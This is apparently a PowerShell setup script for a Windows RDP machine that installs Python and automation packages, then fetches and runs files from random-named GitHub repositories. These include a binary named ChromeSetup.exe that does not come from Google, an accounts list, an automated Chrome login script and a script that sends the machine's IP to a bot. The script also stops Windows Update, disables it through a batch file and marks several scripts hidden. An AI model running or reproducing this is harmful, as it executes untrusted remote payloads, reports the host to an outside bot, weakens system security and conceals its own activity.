Invoke-WebRequest https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe -OutFile C:\Users\tamer\Downloads\python-3.12.1-amd64.exe
cd C:\Users\tamer\Downloads
.\python-3.12.1-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
Start-Sleep -Seconds 110
net stop wuauserv
Start-Sleep -Seconds 4
net stop wuauserv
py -m ensurepip --upgrade

Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -OutFile C:\Users\tamer\Downloads\get-pip.py
.\get-pip.py
py get-pip.py
Start-Sleep -Seconds 25
py -m pip install keyboard pyautogui tqdm requests mailtm
Start-Sleep -Seconds 15
$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\AzureCLI.msi 
Invoke-WebRequest https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/ChromeSetup.exe -OutFile C:\Users\tamer\Desktop\ChromeSetup.exe
cd C:\Users\tamer\Desktop
.\ChromeSetup.exe
Start-Sleep -Seconds 43
Invoke-WebRequest https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/accs_gruzit_pod_rdp.txt -OutFile C:\WindowsAzure\accs_gruzit_pod_rdp.txt
Invoke-WebRequest https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/rdp_script_chrome_and_login.py -OutFile C:\WindowsAzure\rdp_script_chrome_and_login.py
cd C:\WindowsAzure
.\rdp_script_chrome_and_login.py
$FILE=Get-Item 'C:\Users\tamer\Desktop\scri.bat' -Force
$FILE.attributes='Hidden'
$FILE=Get-Item 'C:\Users\tamer\Desktop\scr.ps1' -Force
$FILE.attributes='Hidden'
Invoke-WebRequest https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/disable_winupdate.bat -OutFile C:\Users\tamer\Desktop\disable_winupdate.bat
Start-Process -FilePath "C:\Users\tamer\Desktop\disable_winupdate.bat"
Invoke-WebRequest https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/ip_send_from_rdp_to_bot.py -OutFile C:\ip_send_from_rdp_to_bot.py
$FILE=Get-Item 'C:\Users\tamer\Desktop\disable_winupdate.bat' -Force
$FILE.attributes='Hidden'
Start-Sleep -Seconds 300
#cd C:\Windows\system32
#Start-Process powershell -Verb runAs